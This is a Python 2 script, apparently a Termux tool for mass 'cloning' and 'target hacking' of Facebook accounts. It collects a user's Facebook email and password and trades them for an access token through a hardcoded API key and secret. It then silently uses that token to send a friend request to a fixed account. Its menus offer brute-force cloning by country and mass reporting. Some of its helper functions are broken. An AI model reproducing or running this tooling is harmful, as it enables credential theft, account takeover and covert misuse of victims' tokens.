#!/usr/bin/python2
#coding=By Rana Nadeem Rajput
#The Credit For This Code Goes Rana Nadeem Rajput
#If You Wanna Take Credits For This Code, Please Look Yourself Again...
#Reserved2021.  Rana


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'
R='\033[1;0m'

#Dev: M_Asim-CH
##### LOGO #####
logo = """
[    <>      ༒︎ℝ𝕒𝕟𝕒 ℕ𝕒𝕕𝕖𝕖𝕞 ℝ𝕒𝕛𝕡𝕦𝕥༒︎
[    <>     ♥︎♥︎♥︎♥︎♥︎♥︎♥︎♥︎♥︎♥︎♥︎
[    <>      
[    <>                <> <><><>          <>   <><><>
[    <>                <>     <> <>        <>    <>
[    <>                <>     <>  <>      <>     <><><>
[    <>                <><> <>    <>  <>       <>
[    <><><><><><><><>       <>           <><><>"""
logo2 = """
\033[1;91m ___________________¶¶¶¶¶¶
\033[1;91m ____________¶¶¶¶¶¶¶__¶¶__¶¶¶¶¶¶¶
\033[1;91m __________¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶
\033[1;91m _________¶¶¶¶______¶¶¶¶¶¶______¶¶¶¶
\033[1;91m _________¶¶¶¶______ℝ𝕒𝕟𝕒________¶¶¶¶
\033[1;91m __________¶¶¶____¶¶¶¶¶¶¶¶¶¶____¶¶¶
\033[1;91m ___________¶¶¶¶____¶¶¶¶¶¶____¶¶¶¶
\033[1;91m _____________¶¶¶¶____¶¶____¶¶¶¶
\033[1;91m _______________¶¶¶¶______¶¶¶¶
\033[1;91m _________________¶¶¶¶__¶¶¶¶
\033[1;91m ___________________¶¶¶¶¶¶
\033[1;91m.          ________________¶¶"""
logo3 = """
███╗░░██╗░█████╗░██████╗░███████╗███████╗███╗░░░███╗
████╗░██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░████║
██╔██╗██║███████║██║░░██║█████╗░░█████╗░░██╔████╔██║
██║╚████║██╔══██║██║░░██║██╔══╝░░██╔══╝░░██║╚██╔╝██║
██║░╚███║██║░░██║██████╔╝███████╗███████╗██║░╚═╝░██║
╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═╝"""
logo4 = """
███████████████████████████████████████████████████████████████████████████
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒███▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒██▒▒▄▀▒▒███▒▒▄▀▒▒████▒▒▄▀▒▒███▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒███▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒▒▒███▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒██▒▒▄▀▒▒█
█▒▒▄▀▒▒████▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒▒▒▄▀▒▒█
█▒▒▄▀▒▒▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▄▀▄▀▄▀▒▒█
█▒▒▄▀▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▒▒▒▒▒▒▒▒▄▀▒▒█
█▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██████████▒▒▒▒▒▒█"""
logo5 = """
███████████████████████████████████████████████████████████████████████████
██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░"""
logo6 = """
███████████████████████████████████████████████████████████████████████████
██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░"""
logo7 = """
╭━━━╮╱╱╱╱╱╱╱╱╱╭╮
┃╭━╮┃╱╱╭╮╱╱╱╱╭╯╰╮
┃╰━╯┣━━╋╋━━┳╮┣╮╭╯
┃╭╮╭┫╭╮┣┫╭╮┃┃┃┃┃
┃┃┃╰┫╭╮┃┃╰╯┃╰╯┃╰╮
╰╯╰━┻╯╰┫┃╭━┻━━┻━╯
╱╱╱╱╱╱╭╯┃┃
╱╱╱╱╱╱╰━┻╯"""
logo8 = """
███████████████████████████████████████████████████████████████████████████
██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░"""
logo9 = """
╭━━━╮╱╱╱╱╱╱╱╱╱╭╮
┃╭━╮┃╱╱╭╮╱╱╱╱╭╯╰╮
┃╰━╯┣━━╋╋━━┳╮┣╮╭╯
┃╭╮╭┫╭╮┣┫╭╮┃┃┃┃┃
┃┃┃╰┫╭╮┃┃╰╯┃╰╯┃╰╮
╰╯╰━┻╯╰┫┃╭━┻━━┻━╯
╱╱╱╱╱╱╭╯┃┃
╱╱╱╱╱╱╰━┻╯"""
logo10 = """
███████████████████████████████████████████████████████████████████████████
██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░"""
logo11 = """
╭━━━╮╱╱╱╱╱╱╱╱╱╭╮
┃╭━╮┃╱╱╭╮╱╱╱╱╭╯╰╮
┃╰━╯┣━━╋╋━━┳╮┣╮╭╯
┃╭╮╭┫╭╮┣┫╭╮┃┃┃┃┃
┃┃┃╰┫╭╮┃┃╰╯┃╰╯┃╰╮
╰╯╰━┻╯╰┫┃╭━┻━━┻━╯
╱╱╱╱╱╱╭╯┃┃
╱╱╱╱╱╱╰━┻╯"""
logo12 = """
███████████████████████████████████████████████████████████████████████████
██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░"""
logo13 = """
███████████████████████████████████████████████████████████████████████████
██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░"""
logo14 = """
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo15 = """
███╗░░██╗░█████╗░██████╗░███████╗███████╗███╗░░░███╗
████╗░██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░████║
██╔██╗██║███████║██║░░██║█████╗░░█████╗░░██╔████╔██║
██║╚████║██╔══██║██║░░██║██╔══╝░░██╔══╝░░██║╚██╔╝██║
██║░╚███║██║░░██║██████╔╝███████╗███████╗██║░╚═╝░██║
╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═╝"""
logo16 = """
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo17 = """
███╗░░██╗░█████╗░██████╗░███████╗███████╗███╗░░░███╗
████╗░██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░████║
██╔██╗██║███████║██║░░██║█████╗░░█████╗░░██╔████╔██║
██║╚████║██╔══██║██║░░██║██╔══╝░░██╔══╝░░██║╚██╔╝██║
██║░╚███║██║░░██║██████╔╝███████╗███████╗██║░╚═╝░██║
╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═╝"""
logo18 = """
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo19 = """
███╗░░██╗░█████╗░██████╗░███████╗███████╗███╗░░░███╗
████╗░██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░████║
██╔██╗██║███████║██║░░██║█████╗░░█████╗░░██╔████╔██║
██║╚████║██╔══██║██║░░██║██╔══╝░░██╔══╝░░██║╚██╔╝██║
██║░╚███║██║░░██║██████╔╝███████╗███████╗██║░╚═╝░██║
╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═╝"""
logo20 = """
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo21 = """	
███╗░░██╗░█████╗░██████╗░███████╗███████╗███╗░░░███╗
████╗░██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░████║
██╔██╗██║███████║██║░░██║█████╗░░█████╗░░██╔████╔██║
██║╚████║██╔══██║██║░░██║██╔══╝░░██╔══╝░░██║╚██╔╝██║
██║░╚███║██║░░██║██████╔╝███████╗███████╗██║░╚═╝░██║
╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═╝"""
logo22 = """
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo23 = """
███╗░░██╗░█████╗░██████╗░███████╗███████╗███╗░░░███╗
████╗░██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░████║
██╔██╗██║███████║██║░░██║█████╗░░█████╗░░██╔████╔██║
██║╚████║██╔══██║██║░░██║██╔══╝░░██╔══╝░░██║╚██╔╝██║
██║░╚███║██║░░██║██████╔╝███████╗███████╗██║░╚═╝░██║
╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═╝"""
logo24 = """
██████╗░░█████╗░███╗░░██╗░█████╗░
██╔══██╗██╔══██╗████╗░██║██╔══██╗
██████╔╝███████║██╔██╗██║███████║
██╔══██╗██╔══██║██║╚████║██╔══██║
██║░░██║██║░░██║██║░╚███║██║░░██║
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚═╝"""
logo25 = """
███╗░░██╗░█████╗░██████╗░███████╗███████╗███╗░░░███╗
████╗░██║██╔══██╗██╔══██╗██╔════╝██╔════╝████╗░████║
██╔██╗██║███████║██║░░██║█████╗░░█████╗░░██╔████╔██║
██║╚████║██╔══██║██║░░██║██╔══╝░░██╔══╝░░██║╚██╔╝██║
██║░╚███║██║░░██║██████╔╝███████╗███████╗██║░╚═╝░██║
╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░╚══════╝╚══════╝╚═╝░░░░░╚═╝"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;96m                \033[1;96m
___ ___ ___ ___ ___ ___ /\ \ /\ \ /\ \ /\ \ /\ \ /\ \ ___ /::\ \ /::\ \ /::\ \ /::\ \ /::\ \ /::\ \ /\ \ /:/\:\ \ /:/\:\ \ /:/\:\ \ /:/\:\ \ /:/\:\ \ /:/\ \ \ \:\ \ /::\~\:\ \ /::\~\:\ \ /::\~\:\ \ /:/ \:\__\ /::\~\:\ \ _\:\~\ \ \ /::\__\ /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:\ \:\__\ /:/__/ \:|__| /:/\:\ \:\__\ /\ \:\ \ \__\ __/:/\/__/ \/__\:\/:/ / \/__\:\/:/ / \/_|::\/:/ / \:\ \ /:/ / \/__\:\/:/ / \:\ \:\ \/__/ /\/:/ / \::/ / \::/ / |:|::/ / \:\ /:/ / \::/ / \:\ \:\__\ \::/__/ \/__/ /:/ / |:|\/__/ \:\/:/ / /:/ / \:\/:/ / \:\__\ /:/ / |:| | \::/__/ /:/ / \::/ / \/__/ \/__/ \|__| ~~ \/__/ \/__/ 

\033[1;95m«-----------------\033[1;91m{RANA_NADEEM_RAJPUT}\033[1;95m-----------------»"""")
jalan("\033[1;97m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
jalan("\033[1;97m▇▇\033[1;95m      WellCome to Rana_Nadeem Tools \033[1;92m▇▇")
jalan("\033[1;97m▇▇\033[1;91m             👇Tool Using Tips👇      \033[1;92m▇▇")
jalan("\033[1;97m▇▇\033[1;92m            Tool Update After-Week    \033[1;92m▇▇")
jalan("\033[1;97m▇▇\033[1;92m        Termux Data Clear After-Week  \033[1;92m▇▇")
jalan("\033[1;97m▇▇\033[1;92mWhatsApphttps://03082503426.                           ")
jalan("\033[1;97m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
print "\033[1;95m«-----------------\033[1;91mASIM-EXTRA\033[1;95m-----------------»"

CorrectUsername = "Rana"
CorrectPassword = "Nadeem"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;91mTool Username \x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:M_ASIM
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')

##### LICENSE #####
#=================#
def lisensi():
	os.system('clear')
	login()
####login#########
def login():
	os.system('clear')
	print logo11
	print "\033[1;93m-•◈•-\033[1;91mRana> \033[1;91m1.\x1b[1;96m Login  Facebook  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;91mRana> \033[1;91m3.\x1b[1;97m Get Access Token App Fb"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;91mRana> \033[1;91m0.\033[1;91m Exit             "
	pilih_login()

def pilih_login():
	peak = raw_input("\n\033[1;91mChoose an Option>>> \033[1;95m")
	if peak =="":
		print "\x1b[1;91mFill in correctly"
		pilih_login()
	elif peak =="1":
		login1()
        elif peak =="2":
	        tokenz()
        elif peak =="3":
	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
	        login()
	elif peak =="0":
		keluar()
        else:
		print"\033[1;91m[!] Wrong input"
		keluar()

def login1():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
                time.sleep(0.05)
		print logo13
		jalan(' \033[1;91mWarning  \033[1;92mDo Not Use Your Personal Account' )
		jalan(' \033[1;91mWarning  \033[1;92mUse A New Fast Account To Login' )
		jalan(' \033[1;91mWarning  \033[1;92mMr Nadeem Master Of Facebook' )                 
		print "\033[1;95m«-----------------\033[1;91mstay home save life\033[1;95m-----------------»"
		print('\033[1;97m\x1b[1;92m..............LOGIN WITH FACEBOOK.............\x1b[1;97m' )
		print('	' )
		id = raw_input('\033[1;97m[] \x1b[1;91mFacebook/Email\x1b[1;93m: \x1b[1;93m')
		pwd = raw_input('\033[1;97m[] \x1b[1;91mPassword      \x1b[1;91m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[1;97mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[1;95mLogin Successful.•◈•..'
				os.system('xdg-open print https://www.facebook.com/muhammad.nadeem.5214')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[1;97mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\x1b[1;97mYour Account is on Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\x1b[1;93mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
			
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(o.text)
		nama = a['name']
		id = a['id']
                t = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
                b = json.loads(t.text)
                sub = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;97mYour Account is on Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;94mThere is no internet connection"
		keluar()
	os.system("clear") #Dev:M_Asim
        time.sleep(0.05)
	print logo2
	print "\033[1;93m    «-------\033[1;96mLogged in User Info\033[1;93m----------»"
        time.sleep(0.05)
	print "	   \033[1;93m «----Name\033[1;97m:\033[1;91m"+nama+"\033[1;93m               "
        time.sleep(0.05)
	print "	   \033[1;93m «----ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
        time.sleep(0.05)
	print "\033[1;95m«-----------------\033[1;91mDisclaimer\033[1;95m-----------------»"
        time.sleep(0.05)
        print "\033[1;93m       This Tool is for Educational Purpose"
        time.sleep(0.05)
        print "\033[1;95mThis presentation is for educational"
        time.sleep(0.05)
        print "\033[1;95mpurposes ONLY.How you use this information "
        time.sleep(0.05)
        print "\033[1;95mis your responsibility.I will not be  "
        time.sleep(0.05)
        print "\033[1;95mheld accountable This Tool/Channel Doesn't "
        time.sleep(0.05)
        print "\033[1;95mSupport illegal activities.for any illegal "
        time.sleep(0.05)
        print "\033[1;95mActivitie This Tool is for Educational Purpose"
        time.sleep(0.05)
        print "\033[1;95m«-----------------\033[1;91mRana_Nadeem_Rajput\033[1;95m-----------------»"
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;91m Start    Cloning All Country   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;96m\033[1;91m Start    Target  Hacking        "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\033[1;96m\033[1;93m Facebook Report (Rajput)     "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\033[1;96m\033[1;95m Friend's User    information      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\033[1;96m\033[1;96m ID Not   Found   Problum solve  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m6 .\x1b[1;96m\033[1;91m Rana_Nadeem   infom Massage  "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m7 .\033[1;96m\033[1;93m TRIKS MASTER  Youtube Chenal   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m8 .\033[1;96m\033[1;92m Login    Using   Token          "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m9 .\033[1;96m\033[1;91m Show     Token   login/ID       "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m10.\033[1;96m\033[1;96m Tool     Rest &  Update         "
        time.sleep(0.05)
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m0 .\033[1;91m\033[1;91m logout                         "
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;91mChoose Option>>> \033[1;93m")
	if unikers =="":
		print "\x1b[1;97mFill in correctly"
		pilih()
	elif unikers =="1":
		crack()
        elif unikers =="2":
		os.system('clear')
		print logo
		brute()
        elif unikers =="3":
		fighter()
        elif unikers =="4":
		asif()
        elif unikers =="5":
		os.system('xdg-open https://commentpicker.com/find-facebook-id.php')
	        menu()
        elif unikers =="6":
		os.system('clear')
		print logo7
		print "\033[1;95m«-----------------\033[1;91mMessage\033[1;95m-----------------»"
                jalan('\033[1;92m............Massage..........')
                jalan("\033[1;96mTermux  Data Clear After-1Week")
                jalan('\033[1;96mCommand Complete  95% ')
                jalan('\033[1;96mCommand Update After-1Week')
                jalan("\033[1;93m.........Command...........")
                jalan('\033[1;96mapt update')
                jalan('\033[1;96mapt upgrade')
                jalan('\033[1;96mpkg install python')
                jalan('\033[1;96mpkg install python2')
                jalan('\033[1;96mpkg install git')
                jalan('\033[1;96mpip2 install requests')
                jalan('\033[1;96mpip2 install mechanize') 
                jalan("\033[1;96mgit clone https://github.com/Rananadeem5214/Rana_005.git")
                jalan('\033[1;96mcd Rana_005')
                jalan('\033[1;96mpython2 NADEEM0003.py')
                jalan('\033[1;96mUser:rana')
                jalan('\033[1;96mpass:Nadeem')
                jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                jalan('\033[1;91mYoutube Chenal Like Subscrib')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
        elif unikers =="7":
	        os.system('xdg-open https://www.facebook.com/muhammad.nadeem.5214')
	        menu()
        elif unikers =="8":
		tokenz()
        elif unikers =="9":
		os.system('reset')
		print logo14
		toket=open('login.txt','r').read()
		print "\033[1;91m[+] \033[1;95mYour token\033[1;91m :\033[1;96m "+toket
		raw_input("\n\033[1;91m[ \033[1;93mBack \033[1;91m]")
		menu()
	elif unikers =="10":
		os.system('clear')
		print logo6
		print "\033[1;95m«-----------------\033[1;91mDataReset\033[1;95m-----------------»"
                jalan('\033[1;96m=10%')
                jalan("\033[1;96m==20%")
                jalan('\033[1;96m===30%')
                jalan('\033[1;96m====40%')
                jalan("\033[1;96m=====50%")
                jalan("\033[1;96m======60%")
                jalan('\033[1;96m=======70%')
                jalan('\033[1;96m========80%')
                jalan('\033[1;96m=========90%')
                jalan('\033[1;96m==========100%')
                jalan('\033[1;91mCloning Data Reset')
		os.system('git pull origin master')
		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
		menu()
	elif unikers =="0":
		jalan('Token Removed')
                print logo22
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\x1b[1;91mFill in correctly"
		pilih()

def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[1;94mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo19
	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;95m Start Cloning Pakistan       "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;95m Start Cloning India          "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m3 .\x1b[1;95m Start Cloning Indonesia      "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m4 .\x1b[1;95m Start Cloning United State   "
        time.sleep(0.05)
        print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m5 .\x1b[1;95m Start Cloning Bangladesh     "
        time.sleep(0.05)
